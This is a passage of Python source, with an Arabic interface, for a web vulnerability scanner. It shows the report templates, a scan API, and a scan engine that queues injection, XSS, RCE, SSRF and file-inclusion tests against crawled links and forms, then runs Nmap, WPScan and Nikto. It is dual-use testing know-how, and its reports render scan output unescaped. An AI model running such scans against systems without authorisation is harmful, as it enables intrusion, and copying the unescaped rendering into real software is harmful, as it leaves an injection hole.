                                <div class="medium-count">{{ medium_count }}</div>
                                <div>ثغرات متوسطة الخطورة</div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="stats-card low-bg">
                                <div class="low-count">{{ low_count }}</div>
                                <div>ثغرات منخفضة الخطورة</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row mt-3">
                        <div class="col-md-12">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">معلومات المسح</h5>
                                    <div class="row">
                                        <div class="col-md-3"><strong>الهدف:</strong> {{ target }}</div>
                                        <div class="col-md-3"><strong>وقت المسح:</strong> {{ scan_time }}</div>
                                        <div class="col-md-3"><strong>المدة:</strong> {{ '%.2f'|format(scan_duration) }} ثانية</div>
                                        <div class="col-md-3"><strong>الطلبات:</strong> {{ total_requests }}</div>
                                    </div>
                                    <div class="row mt-2">
                                        <div class="col-md-3"><strong>الوضع العدواني:</strong> {{ 'نعم' if aggressive_mode else 'لا' }}</div>
                                        <div class="col-md-3"><strong>المجالات الفرعية:</strong> {{ subdomains|length }}</div>
                                        <div class="col-md-6"><strong>رؤوس الأمان:</strong> {{ security_headers|length }} رأس تم فحصه</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <ul class="nav nav-tabs" id="myTab" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" id="vulns-tab" data-bs-toggle="tab" data-bs-target="#vulns" type="button" role="tab">الثغرات</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="subdomains-tab" data-bs-toggle="tab" data-bs-target="#subdomains" type="button" role="tab">المجالات الفرعية</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="headers-tab" data-bs-toggle="tab" data-bs-target="#headers" type="button" role="tab">رؤوس الأمان</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="summary-tab" data-bs-toggle="tab" data-bs-target="#summary" type="button" role="tab">ملخص</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="nmap-tab" data-bs-toggle="tab" data-bs-target="#nmap" type="button" role="tab">نتائج Nmap</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="wpscan-tab" data-bs-toggle="tab" data-bs-target="#wpscan" type="button" role="tab">نتائج WPScan</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="nikto-tab" data-bs-toggle="tab" data-bs-target="#nikto" type="button" role="tab">نتائج Nikto</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="js-tab" data-bs-toggle="tab" data-bs-target="#js" type="button" role="tab">تحليل JavaScript</button>
                </li>
            </ul>
            
            <div class="filter-buttons mt-3 mb-3">
                <button class="btn btn-outline-danger btn-sm filter-btn" data-severity="critical">
                    <i class="bi bi-exclamation-octagon"></i> حرجة
                </button>
                <button class="btn btn-outline-warning btn-sm filter-btn" data-severity="high">
                    <i class="bi bi-exclamation-triangle"></i> عالية
                </button>
                <button class="btn btn-outline-primary btn-sm filter-btn" data-severity="medium">
                    <i class="bi bi-info-circle"></i> متوسطة
                </button>
                <button class="btn btn-outline-success btn-sm filter-btn" data-severity="low">
                    <i class="bi bi-check-circle"></i> منخفضة
                </button>
                <button class="btn btn-outline-dark btn-sm filter-btn" data-severity="all">
                    <i class="bi bi-list"></i> الكل
                </button>
            </div>
            
            <div class="tab-content" id="myTabContent">
                <div class="tab-pane fade show active" id="vulns" role="tabpanel">
                    {% if vulnerabilities %}
                    {% for vuln in vulnerabilities %}
                    <div class="card vuln-card {{ vuln.severity }}">
                        <div class="card-body">
                            <div class="d-flex justify-content-between">
                                <h5 class="card-title">{{ vuln.type }}</h5>
                                <span class="badge rounded-pill badge-{{ vuln.severity }}">
                                    {% if vuln.severity == 'critical' %}
                                        حرجة
                                    {% elif vuln.severity == 'high' %}
                                        عالية
                                    {% elif vuln.severity == 'medium' %}
                                        متوسطة
                                    {% else %}
                                        منخفضة
                                    {% endif %}
                                </span>
                            </div>
                            
                            <p class="card-text"><strong>الموقع:</strong> {{ vuln.location }}</p>
                            
                            {% if vuln.payload %}
                            <p class="card-text"><strong>الحمولة:</strong> 
                                <span class="code-block">{{ vuln.payload }}</span>
                            </p>
                            {% endif %}
                            
                            <div class="row">
                                <div class="col-md-4">
                                    <p class="card-text"><strong>الطريقة:</strong> {{ vuln.method }}</p>
                                </div>
                                <div class="col-md-4">
                                    <p class="card-text"><strong>الثقة:</strong> 
                                        {% if vuln.confidence == 'high' %}
                                            <span class="badge bg-success">عالية</span>
                                        {% elif vuln.confidence == 'medium' %}
                                            <span class="badge bg-warning">متوسطة</span>
                                        {% else %}
                                            <span class="badge bg-danger">منخفضة</span>
                                        {% endif %}
                                    </p>
                                </div>
                                <div class="col-md-4">
                                    <p class="card-text"><strong>الوقت:</strong> {{ vuln.timestamp }}</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    {% endfor %}
                    {% else %}
                    <div class="alert alert-success">
                        <i class="bi bi-check-circle-fill"></i> لم يتم اكتشاف أي ثغرات أمنية!
                    </div>
                    {% endif %}
                </div>
                
                <div class="tab-pane fade" id="subdomains" role="tabpanel">
                    {% if subdomains %}
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">المجالات الفرعية المكتشفة ({{ subdomains|length }})</h5>
                            <div class="table-responsive">
                                <table class="table table-striped">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>المجال الفرعي</th>
                                            <th>الحالة</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% for sub in subdomains %}
                                        <tr>
                                            <td>{{ loop.index }}</td>
                                            <td>{{ sub }}</td>
                                            <td>
                                                <span class="badge bg-success">
                                                    <i class="bi bi-check-circle"></i> نشط
                                                </span>
                                            </td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-warning">
                        <i class="bi bi-exclamation-triangle"></i> لم يتم اكتشاف مجالات فرعية
                    </div>
                    {% endif %}
                </div>
                
                <div class="tab-pane fade" id="headers" role="tabpanel">
                    {% if security_headers %}
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">رؤوس الأمان</h5>
                            <div class="table-responsive">
                                <table class="table table-striped">
                                    <thead>
                                        <tr>
                                            <th>الرأس</th>
                                            <th>القيمة</th>
                                            <th>الحالة</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% for header, value in security_headers.items() %}
                                        <tr class="{{ 'header-missing' if value == 'غير موجود' else 'header-present' }}">
                                            <td>{{ header }}</td>
                                            <td>{{ value }}</td>
                                            <td>
                                                {% if value == 'غير موجود' %}
                                                <span class="badge bg-danger">غير موجود</span>
                                                {% else %}
                                                <span class="badge bg-success">موجود</span>
                                                {% endif %}
                                            </td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-danger">
                        <i class="bi bi-x-circle-fill"></i> لم يتم العثور على رؤوس أمان
                    </div>
                    {% endif %}
                </div>
                
                <div class="tab-pane fade" id="summary" role="tabpanel">
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">ملخص النتائج</h5>
                            <div class="table-responsive">
                                <table class="table table-striped summary-table">
                                    <thead>
                                        <tr>
                                            <th>نوع الثغرة</th>
                                            <th>العدد</th>
                                            <th>أعلى خطورة</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% set vuln_types = {} %}
                                        {% for vuln in vulnerabilities %}
                                            {% if vuln.type not in vuln_types %}
                                                {% set _ = vuln_types.update({vuln.type: {'count': 1, 'max_severity': vuln.severity}}) %}
                                            {% else %}
                                                {% set count = vuln_types[vuln.type]['count'] + 1 %}
                                                {% set max_severity = vuln_types[vuln.type]['max_severity'] %}
                                                
                                                {% set severity_order = ['critical', 'high', 'medium', 'low'] %}
                                                {% if severity_order.index(vuln.severity) < severity_order.index(max_severity) %}
                                                    {% set max_severity = vuln.severity %}
                                                {% endif %}
                                                
                                                {% set _ = vuln_types[vuln.type].update({'count': count, 'max_severity': max_severity}) %}
                                            {% endif %}
                                        {% endfor %}
                                        
                                        {% for type, data in vuln_types.items() %}
                                        <tr>
                                            <td>{{ type }}</td>
                                            <td>{{ data.count }}</td>
                                            <td>
                                                <span class="badge badge-{{ data.max_severity }}">
                                                    {% if data.max_severity == 'critical' %}
                                                        حرجة
                                                    {% elif data.max_severity == 'high' %}
                                                        عالية
                                                    {% elif data.max_severity == 'medium' %}
                                                        متوسطة
                                                    {% else %}
                                                        منخفضة
                                                    {% endif %}
                                                </span>
                                            </td>
                                        </tr>
                                        {% else %}
                                        <tr>
                                            <td colspan="3" class="text-center">لا توجد ثغرات للإبلاغ عنها</td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card mt-4">
                        <div class="card-body">
                            <h5 class="card-title">توصيات الأمان</h5>
                            <ul>
                                {% if critical_count > 0 %}
                                <li>إصلاح الثغرات الحرجة أولوية قصوى لتجنب اختراق النظام</li>
                                {% endif %}
                                
                                {% if security_headers %}
                                    {% for header, value in security_headers.items() %}
                                        {% if value == 'غير موجود' %}
                                            {% if header == 'Content-Security-Policy' %}
                                            <li>تطبيق سياسة أمان المحتوى (CSP) لمنع هجمات XSS</li>
                                            {% elif header == 'Strict-Transport-Security' %}
                                            <li>تفعيل HSTS لتطبيق اتصالات HTTPS فقط</li>
                                            {% elif header == 'X-Frame-Options' %}
                                            <li>منع التصيد عبر iframe بتفعيل رأس X-Frame-Options</li>
                                            {% elif header == 'X-Content-Type-Options' %}
                                            <li>تفعيل X-Content-Type-Options لمنع MIME sniffing</li>
                                            {% endif %}
                                        {% endif %}
                                    {% endfor %}
                                {% endif %}
                                
                                {% if subdomains|length > 5 %}
                                <li>مراجعة وإدارة المجالات الفرعية لتفادي الهجمات</li>
                                {% endif %}
                                
                                <li>تحديث جميع المكونات والبرمجيات للنسخ الأحدث</li>
                                <li>تنفيذ اختبارات أمنية دورية</li>
                                <li>تدريب المطورين على ممارسات الترميز الآمن</li>
                            </ul>
                        </div>
                    </div>
                </div>
                
                <div class="tab-pane fade" id="nmap" role="tabpanel">
                    {% if nmap_results %}
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">نتائج فحص Nmap</h5>
                            <div class="nmap-results">
                                {{ nmap_results | safe }}
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-info">
                        <i class="bi bi-info-circle"></i> لم يتم تشغيل فحص Nmap
                    </div>
                    {% endif %}
                </div>
                
                <div class="tab-pane fade" id="wpscan" role="tabpanel">
                    {% if wpscan_results %}
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">نتائج فحص WPScan</h5>
                            <div class="wpscan-results">
                                {{ wpscan_results | safe }}
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-info">
                        <i class="bi bi-info-circle"></i> لم يتم تشغيل فحص WPScan
                    </div>
                    {% endif %}
                </div>
                
                <div class="tab-pane fade" id="nikto" role="tabpanel">
                    {% if nikto_results %}
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">نتائج فحص Nikto</h5>
                            <div class="nikto-results">
                                {{ nikto_results | safe }}
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-info">
                        <i class="bi bi-info-circle"></i> لم يتم تشغيل فحص Nikto
                    </div>
                    {% endif %}
                </div>
                
                <div class="tab-pane fade" id="js" role="tabpanel">
                    {% if hidden_endpoints %}
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">نقاط النهاية المخفية في JavaScript ({{ hidden_endpoints|length }})</h5>
                            <div class="table-responsive">
                                <table class="table table-striped">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>نقطة النهاية</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% for endpoint in hidden_endpoints %}
                                        <tr>
                                            <td>{{ loop.index }}</td>
                                            <td>{{ endpoint }}</td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-info">
                        <i class="bi bi-info-circle"></i> لم يتم اكتشاف نقاط نهاية مخفية في JavaScript
                    </div>
                    {% endif %}
                </div>
            </div>
        </div>
        
        <footer class="bg-light py-3 mt-5 fixed-bottom">
            <div class="container text-center">
                <p class="mb-0">Rebel Security Scanner - النسخة النهائية المحسنة &copy; 2025</p>
            </div>
        </footer>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    const severity = btn.dataset.severity;
                    if(severity === 'all') {
                        document.querySelectorAll('.vuln-card').forEach(card => {
                            card.style.display = 'block';
                        });
                    } else {
                        document.querySelectorAll('.vuln-card').forEach(card => {
                            card.style.display = card.classList.contains(severity) ? 'block' : 'none';
                        });
                    }
                    
                    // تحديث الزر النشط
                    document.querySelectorAll('.filter-btn').forEach(b => {
                        b.classList.remove('active');
                    });
                    btn.classList.add('active');
                });
            });
        </script>
    </body>
    </html>
    ''', **data)

# ===== واجهة API =====
@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    if not data or 'target' not in data:
        return jsonify({'error': 'Target URL required'}), 400
    
    # إعداد معلمات المسح
    global TARGET_URL, SCAN_TYPES
    TARGET_URL = data['target']
    SCAN_TYPES = data.get('scan_types', ['all'])
    
    # بدء المسح في ثريد منفصل
    import threading
    thread = threading.Thread(target=start_scan)
    thread.start()
    
    return jsonify({
        'status': 'scan_started',
        'target': TARGET_URL,
        'scan_id': hash(TARGET_URL + str(time.time()))
    }), 202

@app.route('/api/results', methods=['GET'])
def api_results():
    return jsonify(scan_results.to_dict())

# ===== المحرك الرئيسي =====
def start_scan():
    """بدء عملية المسح الشاملة"""
    global start_time
    start_time = time.time()
    
    logging.info(f"بدء ماسح الأمان ضد {TARGET_URL}")
    logging.info(f"أنواع المسح: {', '.join(SCAN_TYPES)}")
    logging.info(f"عدد الثريدات: {THREADS}")
    logging.info(f"الوضع العدواني: {'نعم' if AGGRESSIVE_MODE else 'لا'}")
    logging.info(f"مهلة الطلبات: {TIMEOUT} ثواني")
    
    # جدولة المسح إذا تم تحديدها
    if SCHEDULE:
        schedule_scan(SCHEDULE)
    
    # اكتشاف جميع الروابط والنماذج
    try:
        response = send_request(TARGET_URL)
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # استخراج جميع الروابط
            links = [a.get('href') for a in soup.find_all('a', href=True) if a.get('href')]
            forms = soup.find_all('form')
            
            logging.info(f"تم اكتشاف {len(links)} رابط و {len(forms)} نموذج")
            
            # تحليل JavaScript لاكتشاف نقاط النهاية المخفية
            if 'js_analysis' in SCAN_TYPES:
                endpoints = analyze_javascript(response)
                for endpoint in endpoints:
                    scan_results.add_hidden_endpoint(endpoint)
                    logging.info(f"تم اكتشاف نقطة نهاية مخفية: {endpoint}")
        else:
            links = []
            forms = []
            logging.error("فشل في جلب الصفحة الرئيسية")
    except Exception as e:
        links = []
        forms = []
        logging.error(f"فشل في جلب الصفحة الرئيسية: {str(e)}")
    
    # إنشاء قائمة المهام
    tasks = []
    
    # إضافة فحوصات GET
    for link in links:
        if link.startswith('http') or link.startswith('//'):
            full_url = link
        else:
            full_url = urljoin(TARGET_URL, link)
        
        # IDOR Scanning
        if 'idor' in SCAN_TYPES:
            tasks.append(('idor', full_url))
        
        # DOM XSS Scanning
        if 'domxss' in SCAN_TYPES:
            tasks.append(('domxss', full_url))
        
        # اكتشاف المعلمات
        parsed = urlparse(full_url)
        params = parse_qs(parsed.query)
        
        for param in params:
            value = params[param][0] if params[param] else ""
            
            # LFI Scanning
            if 'lfi' in SCAN_TYPES:
                tasks.append(('lfi', param, value, 'GET'))
            
            # SSRF Scanning
            if 'ssrf' in SCAN_TYPES:
                tasks.append(('ssrf', param, value, 'GET'))
            
            # XSS Scanning
            if 'xss' in SCAN_TYPES:
                tasks.append(('xss', param, value, 'GET'))
            
            # SQLi Scanning
            if 'sqli' in SCAN_TYPES:
                tasks.append(('sqli', param, value, 'GET'))
            
            # Open Redirect Scanning
            if 'redirect' in SCAN_TYPES:
                tasks.append(('redirect', param, value))
            
            # RCE Scanning
            if 'rce' in SCAN_TYPES:
                tasks.append(('rce', param, value, 'GET'))
            
            # Path Traversal Scanning
            if 'path_traversal' in SCAN_TYPES:
                tasks.append(('path_traversal', param, value, 'GET'))
            
            # Command Injection Scanning
            if 'cmd_injection' in SCAN_TYPES:
                tasks.append(('cmd_injection', param, value, 'GET'))
    
    # إضافة فحوصات POST
    for form in forms:
        action = form.get('action')
        if not action:
            continue
            
        if action.startswith('http') or action.startswith('//'):
            full_url = action
        else:
            full_url = urljoin(TARGET_URL, action)
        
        method = form.get('method', 'GET').upper()
        
        # اكتشاف حقول النموذج
        inputs = form.find_all('input')
        form_data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            if name:
                value = input_tag.get('value', 'FUZZ')
                form_data[name] = value
        
        # File Upload Scanning
        if 'upload' in SCAN_TYPES and form.find('input', {'type': 'file'}):
            tasks.append(('upload', full_url))
        
        # إضافة فحوصات POST الأخرى
        if method == 'POST':
            for param in form_data:
                value = form_data[param]
                
                # LFI Scanning
                if 'lfi' in SCAN_TYPES:
                    tasks.append(('lfi', param, value, 'POST'))
                
                # SSRF Scanning
                if 'ssrf' in SCAN_TYPES:
                    tasks.append(('ssrf', param, value, 'POST'))
                
                # XSS Scanning
                if 'xss' in SCAN_TYPES:
                    tasks.append(('xss', param, value, 'POST'))
                
                # SQLi Scanning
                if 'sqli' in SCAN_TYPES:
                    tasks.append(('sqli', param, value, 'POST'))
                
                # RCE Scanning
                if 'rce' in SCAN_TYPES:
                    tasks.append(('rce', param, value, 'POST'))
                
                # Path Traversal Scanning
                if 'path_traversal' in SCAN_TYPES:
                    tasks.append(('path_traversal', param, value, 'POST'))
                
                # Command Injection Scanning
                if 'cmd_injection' in SCAN_TYPES:
                    tasks.append(('cmd_injection', param, value, 'POST'))
    
    # إضافة الفحوصات العامة
    if 'headers' in SCAN_TYPES:
        tasks.append(('headers',))
    
    if 'subdomain' in SCAN_TYPES:
        tasks.append(('subdomain',))
    
    if 'cors' in SCAN_TYPES:
        tasks.append(('cors',))
    
    if 'csp' in SCAN_TYPES:
        tasks.append(('csp',))
    
    # تنفيذ المهام باستخدام ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        
        # تعيين الوظائف المناسبة لكل مهمة
        for task in tasks:
            task_type = task[0]
            if task_type in SCAN_FUNCTIONS:
                func = SCAN_FUNCTIONS[task_type]
                # تمرير الباقي من العناصر كوسائط
                args = task[1:] if len(task) > 1 else []
                futures.append(executor.submit(func, *args))
        
        # عرض شريط التقدم
        for _ in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="جاري المسح"):
            pass
    
    # تشغيل فحص Nmap إذا تم طلبه
    if RUN_NMAP:
        logging.info(f"{Fore.CYAN}[*] بدء فحص Nmap{Style.RESET_ALL}")
        nmap_results = run_nmap_scan(TARGET_URL)
        if nmap_results:
            scan_results.set_nmap_results(nmap_results)
            logging.info(f"{Fore.GREEN}[+] تم الانتهاء من فحص Nmap{Style.RESET_ALL}")
    
    # تشغيل فحص WPScan إذا تم طلبه
    if RUN_WPSCAN:
        logging.info(f"{Fore.CYAN}[*] بدء فحص WPScan{Style.RESET_ALL}")
        wpscan_results = run_wpscan(TARGET_URL)
        if wpscan_results:
            scan_results.set_wpscan_results(wpscan_results)
            logging.info(f"{Fore.GREEN}[+] تم الانتهاء من فحص WPScan{Style.RESET_ALL}")
    
    # تشغيل فحص Nikto إذا تم طلبه
    if RUN_NIKTO:
        logging.info(f"{Fore.CYAN}[*] بدء فحص Nikto{Style.RESET_ALL}")
        nikto_results = run_nikto(TARGET_URL)
        if nikto_results:
            scan_results.set_nikto_results(nikto_results)
            logging.info(f"{Fore.GREEN}[+] تم الانتهاء من فحص Nikto{Style.RESET_ALL}")
    
    # فحص WebSocket
    if 'websocket' in SCAN_TYPES:
        logging.info(f"{Fore.CYAN}[*] بدء فحص WebSocket{Style.RESET_ALL}")
        # تحويل الرابط إلى WebSocket
        ws_url = TARGET_URL.replace('http://', 'ws://').replace('https://', 'wss://')
        asyncio.run(test_websocket(ws_url))
    
    # حساب مدة المسح
    scan_results.scan_duration = time.time() - start_time
    
    # حفظ التقرير
    if OUTPUT_FILE:
        save_report()
        logging.info(f"التقرير محفوظ في: {OUTPUT_FILE}.{OUTPUT_FORMAT}")
        
        # رفع إلى Google Cloud إذا تم التحديد
        if GCLOUD_BUCKET:
            report_path = f"{OUTPUT_FILE}.{OUTPUT_FORMAT}"
            gcs_url = upload_to_gcloud(report_path, GCLOUD_BUCKET)
            if gcs_url:
                logging.info(f"تم رفع التقرير إلى: {gcs_url}")
    
    # حفظ في قاعدة البيانات
    db = ScanDatabase()
    db.save_scan(scan_results)
    
    # إرسال الإشعارات
    send_notification()
    
    # عرض النتائج
    logging.info(f"\n{Fore.CYAN}{'='*30} نتائج المسح {'='*30}{Style.RESET_ALL}")
    logging.info(f"{Fore.YELLOW}المدة: {scan_results.scan_duration:.2f} ثانية{Style.RESET_ALL}")
    logging.info(f"{Fore.YELLOW}عدد الطلبات: {scan_results.total_requests}{Style.RESET_ALL}")
    logging.info(f"{Fore.GREEN}الثغرات الحرجة: {scan_results.critical_count}{Style.RESET_ALL}")
    logging.info(f"{Fore.RED}الثغرات عالية الخطورة: {scan_results.high_count}{Style.RESET_ALL}")
    logging.info(f"{Fore.BLUE}الثغرات متوسطة الخطورة: {scan_results.medium_count}{Style.RESET_ALL}")
    logging.info(f"{Fore.MAGENTA}الثغرات منخفضة الخطورة: {scan_results.low_count}{Style.RESET_ALL}")
    logging.info(f"{Fore.CYAN}المجالات الفرعية: {len(scan_results.subdomains)}{Style.RESET_ALL}")
    logging.info(f"{Fore.CYAN}نقاط النهاية المخفية: {len(scan_results.hidden_endpoints)}{Style.RESET_ALL}")
    
    # بدء واجهة الويب إذا لم يكن هناك إخراج محدد
    if not OUTPUT_FILE:
        logging.info(f"{Fore.GREEN}بدء واجهة الويب على http://127.0.0.1:5000{Style.RESET_ALL}")
        app.run(host='127.0.0.1', port=5000, use_reloader=False)

# ===== وظيفة حفظ التقرير =====
def save_report():
    if not OUTPUT_FILE:
        return
    
    data = scan_results.to_dict()
    
    if OUTPUT_FORMAT == 'json':
        with open(f"{OUTPUT_FILE}.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    
    elif OUTPUT_FORMAT == 'csv':
        with open(f"{OUTPUT_FILE}.csv", 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['نوع الثغرة', 'الموقع', 'الحمولة', 'المستوى', 'الطريقة', 'الوقت'])
            
            for vuln in data['vulnerabilities']:
                writer.writerow([
                    vuln['type'],
                    vuln['location'],
                    vuln['payload'],
                    vuln['severity'],
                    vuln['method'],
                    vuln['timestamp']
                ])
    
    elif OUTPUT_FORMAT == 'html':
        # Build vulnerability cards HTML
        vuln_cards_html = ""
        if data['vulnerabilities']:
            for vuln in data['vulnerabilities']:
                # Determine badge class based on severity
                if vuln['severity'] == 'critical':
                    badge_class = 'danger'
                elif vuln['severity'] == 'high':
                    badge_class = 'warning'
                elif vuln['severity'] == 'medium':
                    badge_class = 'info'
                else:  # low
                    badge_class = 'success'
                    
                vuln_cards_html += f'''
                <div class="card vuln-card {vuln['severity']} mb-3">
                    <div class="card-body">
                        <h4 class="card-title">{vuln['type']} <span class="badge bg-{badge_class}">{vuln['severity']}</span></h4>
                        <p class="card-text"><strong>الموقع:</strong> {vuln['location']}</p>
                        <p class="card-text"><strong>الحمولة:</strong> <code>{vuln['payload']}</code></p>
                        <p class="card-text"><strong>الطريقة:</strong> {vuln['method']}</p>
                        <p class="card-text"><small class="text-muted">{vuln['timestamp']}</small></p>
                    </div>
                </div>
                '''
        else:
            vuln_cards_html = '<div class="alert alert-success">لم يتم اكتشاف أي ثغرات!</div>'
        
        # Build subdomains HTML
        subdomains_html = ""
        if data['subdomains']:
            subdomains_html = '<ul class="list-group">'
            for sub in data['subdomains']:
                subdomains_html += f'<li class="list-group-item">{sub}</li>'
            subdomains_html += '</ul>'
        else:
            subdomains_html = '<div class="alert alert-warning">لم يتم اكتشاف مجالات فرعية</div>'
        
        # Build security headers HTML
        headers_html = ""
        if data['security_headers']:
            headers_html = '<table class="table table-striped"><thead><tr><th>الرأس</th><th>القيمة</th></tr></thead><tbody>'
            for header, value in data['security_headers'].items():
                row_class = 'table-danger' if value == 'غير موجود' else 'table-success'
                headers_html += f'<tr class="{row_class}"><td>{header}</td><td>{value}</td></tr>'
            headers_html += '</tbody></table>'
        else:
            headers_html = '<div class="alert alert-danger">لم يتم العثور على رؤوس أمان</div>'
        
        # Build nmap results HTML
        nmap_html = ""
        if data['nmap_results']:
            nmap_html = f'<div class="nmap-results">{data["nmap_results"]}</div>'
        else:
            nmap_html = '<div class="alert alert-info">لم يتم تشغيل فحص Nmap</div>'
        
        # Build wpscan results HTML
        wpscan_html = ""
        if data['wpscan_results']:
            wpscan_html = f'<div class="wpscan-results">{data["wpscan_results"]}</div>'
        else:
            wpscan_html = '<div class="alert alert-info">لم يتم تشغيل فحص WPScan</div>'
        
        # Build nikto results HTML
        nikto_html = ""
        if data['nikto_results']:
            nikto_html = f'<div class="nikto-results">{data["nikto_results"]}</div>'
        else:
            nikto_html = '<div class="alert alert-info">لم يتم تشغيل فحص Nikto</div>'
        
        # Build JavaScript analysis HTML
        js_html = ""
        if data['hidden_endpoints']:
            js_html = '<table class="table table-striped"><thead><tr><th>#</th><th>نقطة النهاية</th></tr></thead><tbody>'
            for idx, endpoint in enumerate(data['hidden_endpoints'], 1):
                js_html += f'<tr><td>{idx}</td><td>{endpoint}</td></tr>'
            js_html += '</tbody></table>'
        else:
            js_html = '<div class="alert alert-info">لم يتم اكتشاف نقاط نهاية مخفية في JavaScript</div>'
        
        with open(f"{OUTPUT_FILE}.html", 'w', encoding='utf-8') as f:
            f.write(f'''
            <!DOCTYPE html>
            <html dir="rtl" lang="ar">
            <head>
                <meta charset="UTF-8">
                <title>تقرير أمان - {TARGET_URL}</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
                <style>
                    body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
                    .vuln-card {{ margin-bottom: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
                    .critical {{ border-left: 5px solid #dc3545; }}
                    .high {{ border-left: 5px solid #fd7e14; }}
                    .medium {{ border-left: 5px solid #ffc107; }}
                    .low {{ border-left: 5px solid #198754; }}
                    .summary-table th {{ background-color: #e9ecef; }}
                    .nmap-results, .wpscan-results, .nikto-results {{
                        font-family: monospace;
                        white-space: pre;
                        background-color: #2d2d2d;
                        color: #f8f8f2;
                        padding: 15px;
                        border-radius: 5px;
                        overflow-x: auto;
                    }}
                </style>
            </head>
            <body>
                <div class="container mt-4">
                    <h1 class="mb-4">تقرير مسح أمان</h1>
                    <h2>الهدف: {TARGET_URL}</h2>
                    
                    <div class="row mb-4">
                        <div class="col-md-3">
                            <div class="card">
                                <div class="card-body text-center">
                                    <h3 class="text-danger">{data['critical_count']}</h3>
                                    <p>ثغرات حرجة</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card">
                                <div class="card-body text-center">
                                    <h3 class="text-warning">{data['high_count']}</h3>
                                    <p>ثغرات عالية الخطورة</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card">
                                <div class="card-body text-center">
                                    <h3 class="text-primary">{data['medium_count']}</h3>
                                    <p>ثغرات متوسطة الخطورة</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card">
                                <div class="card-body text-center">
                                    <h3 class="text-success">{data['low_count']}</h3>
                                    <p>ثغرات منخفضة الخطورة</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card mb-4">
                        <div class="card-body">
                            <h3 class="card-title">معلومات المسح</h3>
                            <p><strong>وقت المسح:</strong> {data['scan_time']}</p>
                            <p><strong>المدة:</strong> {data['scan_duration']:.2f} ثانية</p>
                            <p><strong>عدد الطلبات:</strong> {data['total_requests']}</p>
                            <p><strong>الوضع العدواني:</strong> {'نعم' if AGGRESSIVE_MODE else 'لا'}</p>
                            <p><strong>المجالات الفرعية:</strong> {len(data['subdomains'])}</p>
                        </div>
                    </div>
                    
                    <h3>الثغرات المكتشفة ({len(data['vulnerabilities'])})</h3>
                    {vuln_cards_html}
                    
                    <h3>المجالات الفرعية ({len(data['subdomains'])})</h3>
                    {subdomains_html}
                    
                    <h3>رؤوس الأمان ({len(data['security_headers'])})</h3>
                    {headers_html}
                    
                    <h3>نتائج Nmap</h3>
                    {nmap_html}
                    
                    <h3>نتائج WPScan</h3>
                    {wpscan_html}
                    
                    <h3>نتائج Nikto</h3>
                    {nikto_html}
                    
                    <h3>نقاط النهاية المخفية في JavaScript ({len(data['hidden_endpoints'])})</h3>
                    {js_html}
                </div>
            </body>
            </html>
            ''')

if __name__ == "__main__":
    try:
        start_scan()
    except KeyboardInterrupt:
        logging.info(f"{Fore.RED}تم إيقاف المسح بواسطة المستخدم{Style.RESET_ALL}")
        scan_results.scan_duration = time.time() - start_time
        
        if OUTPUT_FILE:
            save_report()
        
        if not OUTPUT_FILE:
